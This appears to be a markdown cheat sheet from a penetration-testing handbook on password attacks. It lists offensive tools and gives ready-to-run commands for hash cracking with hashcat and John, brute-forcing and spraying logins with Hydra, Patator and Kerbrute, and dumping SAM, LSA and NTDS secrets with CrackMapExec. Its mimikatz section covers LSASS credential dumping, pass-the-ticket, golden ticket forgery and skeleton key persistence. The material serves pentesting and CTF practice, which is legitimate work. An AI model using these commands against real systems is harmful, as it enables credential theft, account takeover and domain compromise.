# Password Attacks

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Resources)

## Table of Contents

- [AES](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#AES)
- [bkcrack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#bkcrack)
- [CrackMapExec](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#CrackMapExec)
- [fcrack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#fcrack)
- [GPG](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#GPG)
- [Hash-Buster](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Hash-Buster)
- [hashcat](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#hashcat)
- [Hydra](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Hydra)
- [John](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#John)
- [Kerbrute](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Kerbrute)
- [LaZagne](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#LaZagne)
- [LUKS](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#LUKS)
- [Medusa](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Medusa)
- [mimikatz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#mimikatz)
- [Patator](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#Patator)
- [PDFCrack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#PDFCrack)
- [pypykatz](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#pypykatz)
- [RsaCtfTool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#RsaCtfTool)
- [SprayingToolkit](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#SprayingToolkit)
- [VNC Password Recovery](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/05_password_attacks.md#VNC-Password-Recovery)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| BetterSafetyKatz | Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory. | https://github.com/Flangvik/BetterSafetyKatz |
| bkcrack | Crack legacy zip encryption with Biham and Kocher's known plaintext attack. | https://github.com/kimci86/bkcrack |
| CrackMapExec | CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. | https://github.com/Porchetta-Industries/CrackMapExec |
| CredMaster | Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling | https://github.com/knavesec/CredMaster |
| Default Credentials Cheat Sheet | One place for all the default credentials to assist the pentesters during an engagement, this document has a several products default credentials that are gathered from several sources. | https://github.com/ihebski/DefaultCreds-cheat-sheet |
| DeHashed | Breach Database | https://dehashed.com |
| DomainPasswordSpray | DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS! | https://github.com/dafthack/DomainPasswordSpray |
| Firefox Decrypt | Firefox Decrypt is a tool to extract passwords from Mozilla (Firefox™, Waterfox™, Thunderbird®, SeaMonkey®) profiles | https://github.com/unode/firefox_decrypt |
| go-mimikatz | A wrapper around a pre-compiled version of the Mimikatz executable for the purpose of anti-virus evasion. | https://github.com/vyrus001/go-mimikatz |
| hashcat | Password Cracking | https://hashcat.net/hashcat |
| Hob0Rules | Password cracking rules for Hashcat based on statistics and industry patterns | https://github.com/praetorian-inc/Hob0Rules |
| Hydra | Password Brute Force | https://github.com/vanhauser-thc/thc-hydra |
| John | Password Cracking | https://github.com/openwall/john |
| keepass-dump-masterkey | Script to retrieve the master password of a keepass database <= 2.53.1 | https://github.com/CMEPW/keepass-dump-masterkey |
| KeePwn | A python tool to automate KeePass discovery and secret extraction. | https://github.com/Orange-Cyberdefense/KeePwn |
| Kerbrute | A tool to quickly bruteforce and enumerate valid Active Directory accounts through Kerberos Pre-Authentication. | https://github.com/ropnop/kerbrute |
| LaZagne | The LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. | https://github.com/AlessandroZ/LaZagne |
| mimikatz | Extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. | https://github.com/gentilkiwi/mimikatz |
| Patator | Password Brute Force | https://github.com/lanjelot/patator |
| pypykatz | Mimikatz implementation in pure Python. | https://github.com/skelsec/pypykatz |
| RsaCtfTool | RSA multi attacks tool : uncipher data from weak public key and try to recover private key Automatic selection of best attack for the given public key. | https://github.com/Ganapati/RsaCtfTool |
| SharpChromium | .NET 4.0 CLR Project to retrieve Chromium data, such as cookies, history and saved logins. | https://github.com/djhohnstein/SharpChromium |
| SprayingToolkit | A set of Python scripts/utilities that tries to make password spraying attacks against Lync/S4B & OWA a lot quicker, less painful and more efficient. | https://github.com/byt3bl33d3r/SprayingToolkit |
| TheSprayer | TheSprayer is a cross-platform tool designed to help penetration testers spray passwords against an Active Directory domain without locking out accounts. | https://github.com/coj337/TheSprayer |
| TREVORspray | TREVORspray is a modular password sprayer with threading, clever proxying, loot modules, and more! | https://github.com/blacklanternsecurity/TREVORspray |

## AES

### Cracking AES Encryption

#### Create AES File

```c
aes-256-ctr
aes-128-ofb
aes-192-ofb
aes-256-ofb
aes-128-ecb
aes-192-ecb
aes-256-ecb
```

#### Create String File

```c
Tq+CWzQS0wYzs2rJ+GNrPLP6qekDbwze6fIeRRwBK2WXHOhba7WR2OGNUFKoAvyW7njTCMlQzlwIRdJvaP2iYQ==
```

#### For Loop

```c
$ for i in `cat aes`; do cat string | openssl enc -d -$i -K 214125442A472D4B6150645367566B59 -iv 0 -nopad -nosalt -base64; done
```

## bkcrack

### Cracking .zip File

```c
$ ./bkcrack -L <FILE>.zip
```

```c
$ cat plaintext.txt
Secret:HTB{
```

```c
$ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
```

## CrackMapExec

> https://github.com/Porchetta-Industries/CrackMapExec

### Installation via Poetry

```c
$ pipx install poetry
$ git clone https://github.com/Porchetta-Industries/CrackMapExec
$ cd CrackMapExec
$ poetry install
$ poetry run crackmapexec
```

### Modules

```c
$ crackmapexec ldap -L
$ crackmapexec mysql -L
$ crackmapexec smb -L
$ crackmapexec ssh -L
$ crackmapexec winrm -L
```

### Common Commands

```c
$ crackmapexec smb <RHOST> -u '' -p '' --shares
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
$ crackmapexec smb <RHOST> -u " " -p "" --shares
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
$ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
$ crackmapexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
$ crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>
$ crackmapexec winrm <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
$ crackmapexec <RHOST> -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -m modules/credentials/mimikatz.py
```

## fcrack

```c
$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
```

## GPG

### Decrypt Domain Policy Passwords

```c
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

## Hash-Buster

> https://github.com/s0md3v/Hash-Buster

```c
$ buster -s 2b6d315337f18617ba18922c0b9597ff
```

## hashcat

> https://hashcat.net/hashcat/

> https://hashcat.net/wiki/doku.php?id=hashcat

> https://hashcat.net/cap2hashcat/

> https://hashcat.net/wiki/doku.php?id=example_hashes

```c
$ hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
$ hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
$ hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
$ hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
$ hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
$ hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
$ hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
$ hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
$ hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
$ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
```

### Cracking ASPREPRoast Password File

```c
$ hashcat -m 18200 -a 0 <FILE> <FILE>
```

### Cracking Kerberoasting Password File

```c
$ hashcat -m 13100 --force <FILE> <FILE>
```

### Bruteforce based on the Pattern

```c
$ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate Password Candidates: Wordlist + Pattern

```c
$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
```

### Generate NetNLTMv2 with internalMonologue and crack with hashcat

```c
$ InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
```

### Result

```c
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
```

### Crack with hashcat

```c
$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

### Rules

> https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule

#### Cracking with OneRuleToRuleThemAll.rule

```c
$ hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
```

## Hydra

> https://github.com/vanhauser-thc/thc-hydra

### Common Commands

```c
$ hydra <RHOST> -l <USERNAME> -p <PASSWORD> <PROTOCOL>
$ hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> <PROTOCOL>
$ hydra -C /PATH/TO/WORDLIST/<FILE> <RHOST> ftp
```

### Proxy

```c
$ export HYDRA_PROXY=connect://127.0.0.1:8080
$ unset HYDRA_PROXY
```

### SSH

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> ssh -V
$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> -t 4 ssh
```

### FTP

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> ftp -V -f
```

### SMB

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> smb -V -f
```

### MySQL

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> mysql -V -f
```

### VNC

```c
$ hydra -P passwords.txt <RHOST> vnc -V
```

### Postgres

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> postgres -V
```

### Telnet

```c
$ hydra -L usernames.txt -P passwords.txt <RHOST> telnet -V
```

### HTTP

```c
$ hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
```

### Webform

```c
$ hydra <RHOST> http-post-form -L /PATH/TO/WORDLIST/<FILE> "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT> -P /PATH/TO/WORDLIST/<FILE>
$ hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
$ hydra -l admin -P /PATH/TO/WORDLIST/<FILE> <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
```

## John

> https://github.com/openwall/john

```c
$ john md5 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
$ john sha-1 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
$ john sha256 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
$ john bcrypt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
$ john md4 --wordlist=/usr/share/wordlists/rockyou.txt --format=md4
$ john ntlm --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
$ john sha512 --wordlist=/usr/share/wordlists/rockyou.txt
```

### Using Salt

```c
$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --mask='<SALT>?w'
```

### Cracking RSA

```c
$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt
```

### Cracking Kerberoasting Password File

```c
$ john --format=krb5tgs --wordlist=<FILE> <FILE>
```

### Cracking EncFS/6

```c
$ /usr/share/john/encfs2john.py directory/ > encfs6.xml.john
$ john encfs6.xml.john --wordlist=/usr/share/wordlists/rockyou.txt
```

### Extracting Hash from .kdbx File

```c
$ keepass2john <FILE>.kdbx
```

### Cracking .zip-Files

```c
$ zip2john <FILE> > output.hash
```

### Show cracked Password

```c
$ john --show <FILE>
```

## Kerbrute

> https://github.com/ropnop/kerbrute

### User Enumeration

```c
$ ./kerbrute userenum -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES>
```

### Password Spray

```c
$ ./kerbrute passwordspray -d <DOMAIN> --dc <DOMAIN> /PATH/TO/FILE/<USERNAMES> <PASSWORD>
```

## LaZagne

> https://github.com/AlessandroZ/LaZagne

```c
C:\> laZagne.exe all
```

## LUKS

### Extracting LUKS Header

```c
$ dd if=backup.img of=header.luks bs=512 count=4097
```

## Medusa

```c
$ medusa -h <RHOST> -U usernames.txt -P wordlist.txt -M smbnt
```

## mimikatz

> https://github.com/gentilkiwi/mimikatz

### Dump Hshes

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::minidump /users/admin/Desktop/lsass.DMP
mimikatz # sekurlsa::LogonPasswords
meterpreter > getprivs
meterpreter > creds_all
meterpreter > golden_ticket_create
```

### Pass the Ticket

```c
C:\> .\mimikatz.exe
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Forging Golden Ticket

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
mimikatz # misc::cmd
C:\> klist
C:\> dir \\<RHOST>\admin$
```

### Skeleton Key

```c
C:\> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # misc::skeleton
C:\> net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
C:\> dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
```

## Patator

> https://github.com/lanjelot/patator

```c
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:mesg='Authentication failed.'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:fgrep='failed'
$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:egrep='failed'
```

## PDFCrack

```c
$ pdfcrack -f file.pdf -w /usr/share/wordlists/rockyou.txt
```

## pypykatz

> https://github.com/skelsec/pypykatz

```c
$ pypykatz lsa minidump lsass.dmp
$ pypykatz registry --sam sam system
```

## RsaCtfTool

> https://github.com/Ganapati/RsaCtfTool

```c
$ python3 RsaCtfTool.py --publickey /PATH/TO/<KEY>.pub --uncipherfile /PATH/TO/FILE/<FILE>.enc
```

## SprayingToolkit

> https://github.com/byt3bl33d3r/SprayingToolkit

### OWA

```c
$ python3 atomizer.py owa <RHOST> <PASSWORDS>.txt <USERNAMES>.txt -i 0:0:01
```

## VNC Password Recovery

```c
msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
>>
```
